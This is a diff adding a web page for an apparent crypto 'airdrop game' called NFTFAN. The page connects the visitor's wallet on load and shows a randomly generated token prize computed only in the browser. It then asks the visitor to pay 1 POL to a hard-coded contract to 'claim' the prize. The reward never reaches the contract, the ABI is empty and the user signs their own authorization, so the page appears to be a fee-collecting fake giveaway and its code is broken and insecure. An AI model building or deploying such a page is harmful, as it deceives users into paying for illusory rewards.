@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NFTFAN Random Airdrop Game</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #222;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+        img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            border: none;
+            background: #ff9800;
+            color: white;
+            border-radius: 5px;
+        }
+        #rewardAmount {
+            font-size: 24px;
+            margin: 20px 0;
+        }
+        table {
+            width: 100%;
+            margin-top: 20px;
+            border-collapse: collapse;
+            background: #333;
+            color: white;
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://pbs.twimg.com/media/Gj_Q-GIWEAApdz0?format=png&name=small" alt="NFTFAN Airdrop">
+        <h2>Click to Play & Win NFTFAN Tokens!</h2>
+        <button onclick="generateRandomReward()">Play</button>
+        <p id="rewardAmount">Click Play to generate a reward!</p>
+        <button onclick="claimTokens()">Claim</button>
+        
+        <table>
+            <tr>
+                <th>Step</th>
+                <th>Status</th>
+            </tr>
+            <tr>
+                <td>Wallet Connected</td>
+                <td id="walletStatus">Not Connected</td>
+            </tr>
+            <tr>
+                <td>Tokens Won</td>
+                <td id="tokensWon">-</td>
+            </tr>
+            <tr>
+                <td>Transaction Processing</td>
+                <td id="txStatus">-</td>
+            </tr>
+            <tr>
+                <td>POL Paid</td>
+                <td id="polPaid">-</td>
+            </tr>
+        </table>
+    </div>
+
+    <script>
+        let reward = 0;
+        const minReward = 1_000_000;
+        const maxReward = 10_000_000_000_000_000;
+
+        async function connectWallet() {
+            if (typeof window.ethereum === "undefined") {
+                alert("Please install MetaMask to connect your wallet.");
+                return;
+            }
+            
+            const web3 = new Web3(window.ethereum);
+            const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+            document.getElementById("walletStatus").innerText = accounts[0] ? "Connected" : "Not Connected";
+        }
+
+        function generateRandomReward() {
+            reward = Math.floor(Math.random() * (maxReward - minReward + 1)) + minReward;
+            document.getElementById("rewardAmount").innerText = `You won: ${reward.toLocaleString()} NFTFAN!`;
+            document.getElementById("tokensWon").innerText = reward.toLocaleString();
+        }
+
+        async function claimTokens() {
+            if (reward === 0) {
+                alert("Please play first to get a reward!");
+                return;
+            }
+            
+            if (typeof window.ethereum === "undefined") {
+                alert("Please install MetaMask to claim your tokens.");
+                return;
+            }
+            
+            const web3 = new Web3(window.ethereum);
+            const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+            const user = accounts[0];
+            const contractAddress = "0x9cc9A8025AC96072895fbd2388cA1Cd7a24A8fb3";
+            const contractABI = [
+                // ABI of claimTokens function (replace with actual ABI from your smart contract)
+            ];
+            const contract = new web3.eth.Contract(contractABI, contractAddress);
+            
+            try {
+                document.getElementById("txStatus").innerText = "Processing...";
+                
+                const nonce = Math.floor(Math.random() * 1e6); // Generate a random nonce
+                const timestamp = Math.floor(Date.now() / 1000);
+                
+                // Simulate signing a message (in real use, the backend should sign it)
+                const message = web3.utils.soliditySha3(user, nonce, timestamp);
+                const signature = await web3.eth.personal.sign(message, user);
+                
+                await contract.methods.claimTokens(user, nonce, timestamp, signature)
+                    .send({ from: user, value: web3.utils.toWei("1", "ether") });
+                
+                document.getElementById("txStatus").innerText = "Transaction Successful";
+                document.getElementById("polPaid").innerText = "1 POL Paid";
+                alert("Claim successful! Tokens sent to your wallet.");
+            } catch (error) {
+                console.error(error);
+                document.getElementById("txStatus").innerText = "Failed";
+                alert("Claim failed!");
+            }
+        }
+
+        // Auto-connect wallet on page load
+        window.onload = connectWallet;
+    </script>
+</body>
+</html>
